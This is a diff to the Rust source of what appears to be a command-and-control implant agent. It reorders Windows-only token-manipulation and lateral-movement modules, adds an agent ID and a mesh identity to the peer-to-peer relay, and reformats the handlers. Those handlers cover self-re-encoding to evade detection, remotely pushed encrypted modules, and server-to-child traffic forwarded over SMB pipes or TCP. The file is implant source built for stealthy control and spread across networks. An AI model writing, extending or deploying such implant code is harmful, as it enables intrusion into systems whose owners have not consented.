@@ -24,9 +24,9 @@ pub mod shell;
 pub mod win_types;
 
 #[cfg(windows)]
-pub mod token_manipulation;
-#[cfg(windows)]
 pub mod lateral_movement;
+#[cfg(windows)]
+pub mod token_manipulation;
 
 #[cfg(feature = "outbound-c")]
 pub mod outbound;
@@ -315,6 +315,7 @@ pub struct Agent {
 impl Agent {
     pub fn new(
         transport: Box<dyn Transport + Send>,
+        agent_id: String,
         mesh_private_key: Arc<LockedSecret>,
         mesh_public_key: [u8; 32],
     ) -> Result<Self> {
@@ -363,7 +364,9 @@ impl Agent {
             use base64::Engine;
             let bytes = base64::engine::general_purpose::STANDARD
                 .decode(baked)
-                .map_err(|e| anyhow::anyhow!("SYS_MODULE_KEY baked value is not valid base64: {}", e))?;
+                .map_err(|e| {
+                    anyhow::anyhow!("SYS_MODULE_KEY baked value is not valid base64: {}", e)
+                })?;
             if bytes.len() != 32 {
                 return Err(anyhow::anyhow!("SYS_MODULE_KEY must decode to 32 bytes"));
             }
@@ -393,11 +396,14 @@ impl Agent {
 
         let crypto = Arc::new(CryptoSession::from_key(crypto_key));
         crate::memory_guard::register_session_key(&crypto);
+        let mut p2p_mesh = p2p::P2pMesh::new(agent_id, p2p::P2pMesh::DEFAULT_MAX_CHILDREN);
+        p2p_mesh.set_mesh_identity(mesh_private_key.clone(), mesh_public_key);
+
         Ok(Self {
             transport: Arc::new(Mutex::new(transport)),
             config: Arc::new(RwLock::new(cfg)),
             crypto,
-            p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p::P2pMesh::default())),
+            p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p_mesh)),
             mesh_private_key,
             mesh_public_key,
         })
@@ -700,8 +706,7 @@ impl Agent {
                 let cfg = self.config.read().await;
                 cfg.reencode_interval_secs
             };
-            let default_seed =
-                crate::self_reencode::derive_default_seed(&self.crypto.key_bytes());
+            let default_seed = crate::self_reencode::derive_default_seed(&self.crypto.key_bytes());
             let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
             tasks.spawn(async move {
                 let _ = crate::self_reencode::spawn_periodic_reencode(
@@ -711,7 +716,9 @@ impl Agent {
                 )
                 .await;
             });
-            info!("self-reencode background task spawned (interval={interval}s, seed=auto-derived)");
+            info!(
+                "self-reencode background task spawned (interval={interval}s, seed=auto-derived)"
+            );
         }
 
         // Outbound message channel: spawned command handlers push responses
@@ -729,11 +736,8 @@ impl Agent {
         {
             let mesh = self.p2p_mesh.clone();
             let out_tx = outbound_tx.clone();
-            let _hb_handle = p2p::spawn_heartbeat_task(
-                mesh,
-                out_tx,
-                std::time::Duration::from_secs(30),
-            );
+            let _hb_handle =
+                p2p::spawn_heartbeat_task(mesh, out_tx, std::time::Duration::from_secs(30));
             info!("P2P heartbeat background task spawned (interval=30s)");
         }
 
@@ -902,8 +906,12 @@ impl Agent {
                     let ver_clone = version.clone();
                     let verify_key = self.config.read().await.module_verify_key.clone();
                     tasks.spawn(async move {
-                        let result =
-                            handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto, verify_key.as_deref());
+                        let result = handlers::push_module(
+                            name_clone.clone(),
+                            &encrypted_blob,
+                            &crypto,
+                            verify_key.as_deref(),
+                        );
                         let (outcome, details) = match &result {
                             Ok(s) => {
                                 info!("ModulePush '{}': {}", name_clone, s);
@@ -928,15 +936,23 @@ impl Agent {
                 }) => {
                     // Complete the pending oneshot so the DownloadModule
                     // handler can proceed with loading the module.
-                    if let Some(sender) =
-                        handlers::PENDING_MODULE_REQUESTS.lock().unwrap().remove(&module_id)
+                    if let Some(sender) = handlers::PENDING_MODULE_REQUESTS
+                        .lock()
+                        .unwrap()
+                        .remove(&module_id)
                     {
                         let _ = sender.send(encrypted_blob);
                     } else {
-                        warn!("Received ModuleResponse for unknown module_id '{}'", module_id);
+                        warn!(
+                            "Received ModuleResponse for unknown module_id '{}'",
+                            module_id
+                        );
                     }
                 }
-                Ok(Message::P2pToChild { child_link_id, data }) => {
+                Ok(Message::P2pToChild {
+                    child_link_id,
+                    data,
+                }) => {
                     // Server → child: re-encrypt with child's per-link key
                     // and send as DataForward P2P frame.
                     #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
@@ -964,7 +980,10 @@ impl Agent {
                             }
                         }
                     }
-                    #[cfg(not(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp")))]
+                    #[cfg(not(any(
+                        all(windows, feature = "smb-pipe-transport"),
+                        feature = "p2p-tcp"
+                    )))]
                     {
                         let _ = (child_link_id, data);
                         warn!("P2pToChild received but no P2P transport feature enabled");
@@ -973,15 +992,20 @@ impl Agent {
                 Ok(Message::MeshCertificateIssuance { certificate }) => {
                     info!("MeshCertificateIssuance received — storing mesh certificate");
                     let mut mesh_guard = self.p2p_mesh.lock().await;
-                    mesh_guard.store_mesh_certificate(certificate);
+                    if let Err(e) = mesh_guard.store_mesh_certificate(certificate) {
+                        warn!("rejected mesh certificate from server: {e}");
+                    }
                 }
-                Ok(Message::MeshCertificateRevocation { revoked_agent_id_hash }) => {
+                Ok(Message::MeshCertificateRevocation {
+                    revoked_agent_id_hash,
+                }) => {
                     info!(
                         "MeshCertificateRevocation received — revoking agent hash {:?}",
                         revoked_agent_id_hash
                     );
                     let mut mesh_guard = self.p2p_mesh.lock().await;
-                    let terminated = mesh_guard.handle_certificate_revocation(revoked_agent_id_hash);
+                    let terminated =
+                        mesh_guard.handle_certificate_revocation(revoked_agent_id_hash);
                     if !terminated.is_empty() {
                         info!(
                             "certificate revocation terminated {} link(s)",
